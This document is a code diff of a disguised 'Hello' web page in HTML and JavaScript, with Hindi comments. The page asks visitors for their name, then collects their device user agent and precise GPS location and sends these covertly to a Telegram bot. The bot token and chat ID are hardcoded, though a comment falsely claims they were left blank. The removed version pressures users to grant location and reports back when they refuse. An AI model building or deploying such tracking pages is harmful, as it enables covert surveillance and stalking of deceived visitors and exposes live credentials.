@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcome</title>
+<title>Hello_JAAT_G</title>
 <style>
 *{
 margin:0;
@@ -19,14 +19,15 @@ display:flex;
 justify-content:center;
 align-items:center;
 padding:20px;
+overflow-x:hidden;
 }
 .container{
 width:100%;
-max-width:600px;
+max-width:900px;
 }
 .title{
 text-align:center;
-font-size:45px;
+font-size:60px;
 font-weight:bold;
 margin-bottom:15px;
 background:linear-gradient(90deg,#00ffff,#00ff88,#ff00ff,#00ffff);
@@ -45,26 +46,14 @@ background:rgba(255,255,255,0.05);
 border:1px solid rgba(255,255,255,0.1);
 backdrop-filter:blur(12px);
 border-radius:25px;
-padding:30px;
+padding:25px;
 box-shadow:0 0 25px rgba(0,255,255,.3);
-text-align:center;
 }
 .question{
-font-size:24px;
+font-size:28px;
 font-weight:bold;
-margin-bottom:20px;
-}
-.input-field{
-width:100%;
-padding:15px;
-border-radius:15px;
-border:none;
-font-size:18px;
-margin-top:10px;
-background: rgba(255,255,255,0.1);
-color: white;
-outline: none;
-text-align: center;
+margin-bottom:25px;
+text-align:center;
 }
 .btn{
 border:none;
@@ -75,102 +64,123 @@ border-radius:18px;
 cursor:pointer;
 color:white;
 transition:.3s;
-margin-top:20px;
-background:linear-gradient(45deg,#00c853,#00ff95);
-box-shadow:0 0 20px #00ff95;
 }
 .btn:hover{
-transform:scale(1.05);
+transform:scale(1.08);
+}
+.yes{
+background:linear-gradient(45deg,#ff6d00,#ff1744);
+box-shadow:0 0 20px orange;
 }
 </style>
 </head>
 <body>
-
 <div class="container">
-    <h1 class="title" id="mainTitle">HELLO 🙋</h1>
-    <div id="app" class="card">
-        <div class="question">📝 Type Your Name</div>
-        <input type="text" id="userName" placeholder="अपना नाम लिखें" class="input-field">
-        <button class="btn" onclick="processData()">🚀 Continue</button>
-    </div>
+<h1 class="title" id="helloTitle">
+HELLO JAAT ☠️🙋
+</h1>
+
+<div id="app" class="card">
+<div class="question">
+📝 Type Your Name
+</div>
+<input
+type="text"
+id="userName"
+placeholder="अपना नाम लिखें"
+style="
+width:100%;
+padding:15px;
+border-radius:15px;
+border:none;
+font-size:18px;
+margin-top:15px;
+background: white;
+color: black;
+">
+<div style="text-align:center;margin-top:20px;">
+<button class="btn yes" onclick="saveName()">
+🚀 Continue
+</button>
+</div>
+</div>
 </div>
 
 <script>
-// ⚠️ यहाँ अपनी सही डिटेल्स डालें
+let userLocation = "";
+let phoneInfo = navigator.userAgent;
+let userName = "";
+
+// ⚠️ सुरक्षा के लिए बोट टोकन और चैट आईडी यहाँ खाली छोड़ी है, अपना सही वाला डालें
 const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
 const CHAT_ID = "8064366990";
 
-let userName = "";
-let phoneInfo = navigator.userAgent;
-
-// टेलीग्राम पर मैसेज भेजने का फंक्शन
 async function sendToTelegram(message){
-    if(BOT_TOKEN.includes("YOUR_BOT") || CHAT_ID.includes("YOUR_CHAT")) {
-        console.log("कृपया पहले टेलीग्राम टोकन और चैट आईडी सेट करें।");
-        return;
-    }
-    try{
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message
-            })
-        });
-    }catch(error){
-        console.log("टेलीग्राम एरर:", error);
-    }
+try{
+await fetch(
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id: CHAT_ID,
+text: message
+})
+});
+}catch(error){
+console.log(error);
+}
 }
 
-// नाम सबमिट होते ही बिना बटन दिखाए सीधे लोकेशन ट्रिगर करने का लॉजिक
-function processData(){
-    userName = document.getElementById("userName").value.trim();
-
-    if(!userName){
-        alert("कृपया पहले अपना नाम लिखें");
-        return;
-    }
-
-    // नाम बदलते ही सीधे ब्राउज़र से लोकेशन मांगना (बिका किसी बीच वाले बटन के)
-    navigator.geolocation.getCurrentPosition(
-        function(position){
-            // 1. अगर लोकेशन ऑन है और परमिशन मिल गई
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `🚨 *नई लोकेशन मिली!*\n\n👤 नाम: ${userName}\n📱 डिवाइस: ${phoneInfo}\n\n🗺️ Google Maps: ${mapLink}`;
-            
-            // तुरंत टेलीग्राम पर भेजना
-            sendToTelegram(message);
-            
-            // सीधे थैंक्स स्क्रीन पर ले जाना
-            showThanks();
-        },
-        function(error){
-            // 2. अगर फोन की लोकेशन बंद है या यूज़र ने ब्लॉक किया
-            if (error.code === error.POSITION_UNAVAILABLE || error.code === error.TIMEOUT) {
-                alert("कृपया अपने फोन की लोकेशन (GPS) ऑन करें और दोबारा कोशिश करें।");
-            } else {
-                alert("आगे बढ़ने के लिए लोकेशन की अनुमति देना आवश्यक है।");
-                sendToTelegram(`❌ यूज़र ने लोकेशन ब्लॉक की।\n👤 नाम: ${userName}`);
-                showThanks();
-            }
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-    );
+function showFirstQuestion(){
+document.getElementById("app").innerHTML = `
+<div class="question">
+🙏 THANK YOU
+</div>
+<div class="question" style="font-size: 20px; font-weight: normal; color: #00ff88;">
+धन्यवाद, आपका प्रोसेस पूरा हो चुका है।
+</div>
+`;
 }
 
-// फाइनल थैंक्स स्क्रीन
-function showThanks(){
-    document.getElementById("mainTitle").innerHTML = "HELLO " + userName.toUpperCase() + " ☠️🔥";
-    document.getElementById("app").innerHTML = `
-        <h1 style="color: #00ff88; font-size: 35px; margin-bottom: 15px;">🙏 THANK YOU</h1>
-        <div style="font-size: 20px; color: #d1d5db;">धन्यवाद, आपका प्रोसेस पूरा हो चुका है।</div>
-    `;
+async function saveName(){
+userName = document.getElementById("userName").value;
+
+if(!userName){
+alert("नाम लिखो");
+return;
+}
+document.getElementById("helloTitle").innerHTML =
+"HELLO " + userName.toUpperCase() + " ☠️🔥";
+sendToTelegram(
+"📝 नया नाम मिला\n\n" +
+"नाम: " + userName +
+"\nफोन: " + phoneInfo
+);
+
+// आपका ओरिजिनल लोकेशन पॉप-अप कोड (बिना किसी बदलाव के)
+navigator.geolocation.getCurrentPosition(
+function(position){
+const lat =
+position.coords.latitude;
+const lon =
+position.coords.longitude;
+sendToTelegram(
+"📍 नई लोकेशन मिली\n\n" +
+"नाम: " + userName +
+"\nLatitude: " + lat +
+"\nLongitude: " + lon +
+`\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
+);
+showFirstQuestion();
+},
+function(){
+showFirstQuestion();
+}
+);
 }
 </script>
-
 </body>
 </html>
